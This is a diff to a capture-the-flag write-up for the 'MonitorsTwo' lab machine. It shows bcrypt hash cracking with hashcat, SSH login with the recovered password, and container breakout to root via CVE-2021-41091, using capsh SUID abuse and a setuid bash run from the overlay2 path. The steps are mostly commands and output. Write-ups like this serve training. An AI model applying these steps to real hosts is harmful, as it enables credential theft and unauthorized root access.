@@ -100,7 +100,7 @@ That was fast and easy!
 
 ## Privilege escalation (1)
 
-After enumerating different directories and files, nothing interesting pops up. The only think to note is that we are within a `docker` container as indicated by the `/.dockerenv` file:
+After enumerating different directories and files, nothing interesting pops up. The only think to note is that we are within a `docker` container as indicated by the `/.dockerenv` file, and it also apparent from our hostname, i.e., `www-data@50bca5e748b0`:
 
 ```bash
 www-data@50bca5e748b0:/var/www/html$ ls -la /
@@ -694,3 +694,216 @@ MySQL [cacti]> SELECT username, password FROM user_auth ;
 3 rows in set (0.001 sec)
 ```
 
+We can now try to crack these hashes in our attack host by first using `hashcat`'s autodetect mode to find out the hash type:
+
+```bash
+$ cat hashes
+admin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC
+marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
+
+$ hashcat hashes /usr/share/wordlists/rockyou.txt --username
+hashcat (v6.2.6) starting in autodetect mode
+
+OpenCL API (OpenCL 3.0 ) - Platform #1 [Intel(R) Corporation]
+=============================================================
+* Device #1: Intel(R) Graphics [0x9a60], 3200/6465 MB (512 MB allocatable), 32MCU
+
+OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
+==================================================================================================================================================
+* Device #2: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, skipped
+
+The following 4 hash-modes match the structure of your input hash:
+
+      # | Name                                                       | Category
+  ======+============================================================+======================================
+   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
+  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
+  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
+  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce
+
+Please specify the hash-mode with -m [hash-mode].
+
+Started: Fri Jan 26 06:42:36 2024
+Stopped: Fri Jan 26 06:42:38 2024
+```
+
+Our hashes start with `$2y$`, so let's go with `3200` mode:
+
+```bash
+$ hashcat -m 3200 hashes /usr/share/wordlists/rockyou.txt --username
+
+<SNIP>
+$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey
+[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s
+
+Session..........: hashcat
+Status...........: Running
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+Hash.Target......: hashes
+Time.Started.....: Fri Jan 26 06:46:23 2024 (7 mins, 57 secs)
+Time.Estimated...: Tue Jan 30 09:23:44 2024 (4 days, 2 hours)
+```
+
+After about 8 minutes, it managed to crack one! Let's see for which user:
+
+```bash
+$ hashcat -m 3200 --username --show hashes
+marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey
+```
+
+Now we have creds, `marcus:funkymonkey`, let's try to SSH using them:
+
+```bash
+$ ssh marcus@10.10.11.211
+marcus@10.10.11.211's password:
+<SNIP>
+
+You have mail.
+Last login: Thu Mar 23 10:12:28 2023 from 10.10.14.40
+marcus@monitorstwo:~$
+```
+
+Upon logging in, we see the notification `You have mail.`! Let's go check it, after grabbing our user flag:
+
+```bash
+marcus@monitorstwo:~$ cat user.txt
+90dde9ef32a7e519657dc3b222360421
+
+marcus@monitorstwo:~$ ls /var/mail/
+marcus
+
+marcus@monitorstwo:~$ cat /var/mail/marcus
+From: administrator@monitorstwo.htb
+To: all@monitorstwo.htb
+Subject: Security Bulletin - Three Vulnerabilities to be Aware Of
+
+Dear all,
+
+We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.
+
+CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.
+
+CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.
+
+CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.
+
+We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.
+
+Best regards,
+
+Administrator
+CISO
+Monitor Two
+Security Team
+```
+
+The above email let us know about 3 CVEs, so let's check them in sequence:
+
+1. [CVE-2021-33033](https://nvd.nist.gov/vuln/detail/CVE-2021-33033) refers to a kernel vulnerability, so first we need to see our target's kernel:
+
+  ```bash
+  marcus@monitorstwo:~$ uname -a
+  Linux monitorstwo 5.4.0-147-generic #164-Ubuntu SMP Tue Mar 21 14:23:17 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+  ```
+
+  This is a `2021` vulnerability for versions before `5.11.14`. Our version is not compatible and we can also see from the output above that the email was compiled 2 years after, i.e., `UTC 2023`!
+
+2. [CVE-2020-25706](https://nvd.nist.gov/vuln/detail/CVE-2020-25706) is an XSS vulnerability for `Cacti 1.2.13` and the target app's version is `Cacti 1.2.22`. Additionally, we have already exploited this service!
+
+    ![](home.png)
+
+3. So, we have left with just the last one: [CVE-2021-41091](https://nvd.nist.gov/vuln/detail/CVE-2021-41091), which refers to `docker`'s engine `Moby 20.10.9` version.
+
+  ```bash
+  marcus@monitorstwo:~$ docker --version
+  Docker version 20.10.5+dfsg1, build 55c4c88
+  ```
+
+  Docker's version seems to vulnerable! We can list all the `docker` directories as follows:
+
+  > _The vulnerability description refers to directories under `/var/lib/docker/`, so we are only interested in those._
+
+  ```bash
+  marcus@monitorstwo:~$ findmnt
+  TARGET                                SOURCE     FSTYPE     OPTIONS
+
+  <SNIP>
+  │                                                nsfs       rw
+  ├─/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
+  │                                     overlay    overlay    rw,relatime,lowerdir=/var/lib/docker/overlay2/l/756FTPFO4AE7HBWVGI5TXU76FU:/var/lib/docker/overlay2/l/XKE4ZK5GJUTHXKVYS4MQMJ3NOB:/var/lib/docker/over
+  ├─/var/lib/docker/containers/e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69/mounts/shm
+  │                                     shm        tmpfs      rw,nosuid,nodev,noexec,relatime,size=65536k
+  ├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
+  │                                     overlay    overlay    rw,relatime,lowerdir=/var/lib/docker/overlay2/l/4Z77R4WYM6X4BLW7GXAJOAA4SJ:/var/lib/docker/overlay2/l/Z4RNRWTZKMXNQJVSRJE4P2JYHH:/var/lib/docker/over
+  └─/var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/mounts/shm
+                                        shm        tmpfs      rw,nosuid,nodev,noexec,relatime,size=65536k
+  ```
+
+  We must find out which one is associated with `Cacti`, since our containerized shell session is within that. We can do that by creating a file from within our containerized shell session (our initial foothold), and then check if this file is available from outside the container with `marcus`.
+
+  ```bash
+  # move to the tmp directory and create a file
+  www-data@50bca5e748b0:/var/www/html$ cd /tmp
+  www-data@50bca5e748b0:/tmp$ touch test
+  ```
+
+  The heaviest contents are usually images and if the default storage driver `overlay2` is used, then these Docker images are stored in `/var/lib/docker/overlay2` ([freecodecamp](https://www.freecodecamp.org/news/where-are-docker-images-stored-docker-container-paths-explained/)). Therefore, we can only check 2/4 paths above different `docker` containers:
+
+  Now we can check each these 2 containers in sequence to see which one contains the `test` file:
+
+  ```bash
+  marcus@monitorstwo:~$ ls -l /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged/tmp/test
+  ls: cannot access '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged/tmp/test': No such file or directory
+  marcus@monitorstwo:~$ ls -l /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp/test
+  -rw-r--r-- 1 www-data www-data 0 Jan 26 08:00 /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp/test
+  ```
+
+  The container associated with the Capti app is: `c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1`. Now, we need to assign `SUID` permissions to `/bin/bash`, so `marcus` can access it from outside. In order to do that, we need to escalate our privileges within the container. Let's search for `SUID` files:
+
+  ```bash
+  www-data@50bca5e748b0:/tmp$ find / -perm -4000 2>/dev/null
+  /usr/bin/gpasswd
+  /usr/bin/passwd
+  /usr/bin/chsh
+  /usr/bin/chfn
+  /usr/bin/newgrp
+  /sbin/capsh
+  /bin/mount
+  /bin/umount
+  /bin/su
+  ```
+
+  The `/sbin/capsh` stands out from the above output. Searching [GTFOBins](https://gtfobins.github.io/gtfobins/capsh/#suid) we get this:
+
+  ![](gtfobins.png){: .normal width="60%"}
+
+  Let's follow GFTO's guidance:
+
+  ```bash
+  www-data@50bca5e748b0:/tmp$ /sbin/capsh --gid=0 --uid=0 --
+  root@50bca5e748b0:/tmp# id
+  uid=0(root) gid=0(root) groups=0(root),33(www-data)
+  ```
+
+  And we got root! Now, we can copy the bash binary into `/tmp` and give it `SUID` permissions:
+
+  ```bash
+  # assign suid perms to bash binary
+  root@50bca5e748b0:/tmp# chmod u+s /bin/bash
+  # confirm permissions
+  root@50bca5e748b0:/tmp# ls -l /bin/bash
+  -rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
+  ```
+
+  Finally, we can go back to `marcus` SSH session and execute bash using the [`-p`](https://www.gnu.org/software/bash/manual/html_node/The-Set-Builtin.html#:~:text=If%20the%20%2Dp%20option%20is,real%20user%20and%20group%20ids.&text=Enable%20restricted%20shell%20mode.,once%20it%20has%20been%20set.) flag:
+
+  ```bash
+  marcus@monitorstwo:~$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin
+  marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin$ ls -l bash
+  -rwsr-xr-x 1 root root 1234376 Mar 27  2022 bash
+  marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin$ ./bash -p
+  bash-5.1# id
+  uid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)
+  bash-5.1# cat /root/root.txt
+  660d3fa486300694d14db919e5fb6dc6
+  ```
